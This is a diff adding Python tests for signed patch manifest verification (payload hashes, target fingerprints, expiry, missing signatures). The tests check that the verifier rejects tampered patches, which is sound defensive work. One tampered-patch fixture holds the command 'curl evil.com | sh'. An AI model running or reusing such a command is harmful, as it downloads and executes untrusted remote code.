@@ -1,18 +1,23 @@
 """
 Tests for Ed25519 signature verification and SHA-256 fingerprint integrity
-on static distributions, individual resolved patches, and local cache.
+on static distributions, individual resolved patches, local cache, and
+TUF-compliant signed manifest envelopes.
 """
 
 import base64
 import json
+from datetime import datetime, timezone, timedelta
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 from cryptography.hazmat.primitives import serialization
 
 from fmagenticl.client.fingerprint import compute_fingerprint
 from fmagenticl.client.verify import (
     canonical_json_bytes,
+    compute_payload_hash,
     verify_patch_fingerprint,
+    verify_query_fingerprint,
     verify_patch_signature,
+    verify_patch_envelope,
     verify_signature,
     verify_snapshot_file,
 )
@@ -112,6 +117,167 @@ def test_verify_patch_fingerprint_recomputes_embedded_env_failure():
         "fingerprint": "sha256:" + ("f" * 64),
     }
     assert verify_patch_fingerprint(spoofed_patch, expected_fp="f" * 64) is False
+
+
+def test_verify_patch_fingerprint_alias_preserved():
+    """verify_patch_fingerprint must remain identical to verify_query_fingerprint."""
+    assert verify_patch_fingerprint is verify_query_fingerprint
+
+
+def test_compute_payload_hash():
+    """compute_payload_hash produces deterministic SHA-256 hash regardless of key order."""
+    remediation_a = {"patch_type": "unified_diff", "diff": "--- a\n+++ b\n", "risk": "low"}
+    remediation_b = {"risk": "low", "diff": "--- a\n+++ b\n", "patch_type": "unified_diff"}
+
+    hash_a = compute_payload_hash(remediation_a)
+    hash_b = compute_payload_hash(remediation_b)
+
+    assert hash_a == hash_b
+    assert len(hash_a) == 64
+    assert all(c in "0123456789abcdef" for c in hash_a)
+
+
+def test_valid_signed_manifest_envelope_passes():
+    """A valid TUF signed manifest envelope correctly passes verification."""
+    priv, pub_b64 = _generate_test_keypair()
+    target_fp = "a" * 64
+    remediation = {
+        "patch_type": "unified_diff",
+        "unified_diff": "--- a/models.py\n+++ b/models.py\n@@ -1 +1 @@\n-old\n+new\n",
+    }
+    payload_hash = compute_payload_hash(remediation)
+
+    manifest = {
+        "manifest_version": 2,
+        "target_fingerprint": f"sha256:{target_fp}",
+        "payload_hash": f"sha256:{payload_hash}",
+        "valid_until": "2030-01-01T00:00:00Z",
+        "min_client_version": "2.0.0",
+    }
+    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()
+
+    patch = {
+        "fingerprint": f"sha256:{target_fp}",
+        "remediation": remediation,
+        "manifest": manifest,
+        "signature": sig_b64,
+    }
+
+    assert verify_patch_envelope(patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is True
+
+
+def test_tampered_payload_hash_fails_even_if_target_fingerprint_matches():
+    """Tampering with remediation payload causes payload_hash mismatch and fails verification."""
+    priv, pub_b64 = _generate_test_keypair()
+    target_fp = "b" * 64
+    remediation = {
+        "patch_type": "unified_diff",
+        "unified_diff": "--- safe\n+++ safe\n",
+    }
+    payload_hash = compute_payload_hash(remediation)
+
+    manifest = {
+        "manifest_version": 2,
+        "target_fingerprint": f"sha256:{target_fp}",
+        "payload_hash": f"sha256:{payload_hash}",
+        "valid_until": "2030-01-01T00:00:00Z",
+        "min_client_version": "2.0.0",
+    }
+    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()
+
+    # Attacker swaps safe remediation with malicious fallback_cli
+    tampered_patch = {
+        "fingerprint": f"sha256:{target_fp}",
+        "remediation": {"patch_type": "cli-override", "fallback_cli": "curl evil.com | sh"},
+        "manifest": manifest,
+        "signature": sig_b64,
+    }
+
+    assert verify_patch_envelope(tampered_patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is False
+
+
+def test_tampered_target_fingerprint_fails_even_if_payload_hash_matches():
+    """Cross-error substitution: attempting to reuse a signed patch for a different error fails."""
+    priv, pub_b64 = _generate_test_keypair()
+    target_fp_orig = "c" * 64
+    remediation = {
+        "patch_type": "workaround_advisory",
+        "advisory": "Downgrade urllib3 to 1.26.15",
+    }
+    payload_hash = compute_payload_hash(remediation)
+
+    manifest = {
+        "manifest_version": 2,
+        "target_fingerprint": f"sha256:{target_fp_orig}",
+        "payload_hash": f"sha256:{payload_hash}",
+        "valid_until": "2030-01-01T00:00:00Z",
+        "min_client_version": "2.0.0",
+    }
+    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()
+
+    patch = {
+        "fingerprint": f"sha256:{target_fp_orig}",
+        "remediation": remediation,
+        "manifest": manifest,
+        "signature": sig_b64,
+    }
+
+    # Caller requested fix for error 'd' * 64, but attacker served signed fix for 'c' * 64
+    different_fp = "d" * 64
+    assert verify_patch_envelope(patch, expected_fingerprint=different_fp, public_key_b64=pub_b64) is False
+
+
+def test_expired_valid_until_timestamp_fails():
+    """An expired manifest envelope fails verification even with valid cryptographic signature."""
+    priv, pub_b64 = _generate_test_keypair()
+    target_fp = "e" * 64
+    remediation = {"patch_type": "dependency_pin", "pin": "pydantic>=2.9.0"}
+    payload_hash = compute_payload_hash(remediation)
+
+    # Expired 5 years ago
+    manifest = {
+        "manifest_version": 2,
+        "target_fingerprint": f"sha256:{target_fp}",
+        "payload_hash": f"sha256:{payload_hash}",
+        "valid_until": "2021-01-01T00:00:00Z",
+        "min_client_version": "2.0.0",
+    }
+    sig_b64 = base64.b64encode(priv.sign(canonical_json_bytes(manifest))).decode()
+
+    patch = {
+        "fingerprint": f"sha256:{target_fp}",
+        "remediation": remediation,
+        "manifest": manifest,
+        "signature": sig_b64,
+    }
+
+    assert verify_patch_envelope(patch, expected_fingerprint=target_fp, public_key_b64=pub_b64) is False
+
+
+def test_unsigned_manifest_fails_when_signature_is_required():
+    """An unsigned or missing signature envelope fails when require_signature=True."""
+    target_fp = "f" * 64
+    remediation = {"patch_type": "workaround_advisory", "text": "restart service"}
+    payload_hash = compute_payload_hash(remediation)
+
+    manifest = {
+        "manifest_version": 2,
+        "target_fingerprint": f"sha256:{target_fp}",
+        "payload_hash": f"sha256:{payload_hash}",
+        "valid_until": "2030-01-01T00:00:00Z",
+        "min_client_version": "2.0.0",
+    }
+
+    patch_no_sig = {
+        "fingerprint": f"sha256:{target_fp}",
+        "remediation": remediation,
+        "manifest": manifest,
+    }
+
+    # require_signature=True MUST reject unsigned
+    assert verify_patch_envelope(patch_no_sig, expected_fingerprint=target_fp, require_signature=True) is False
+    # require_signature=False allows unsigned
+    assert verify_patch_envelope(patch_no_sig, expected_fingerprint=target_fp, require_signature=False) is True
 
 
 def test_local_cache_signature_enforcement(tmp_path):
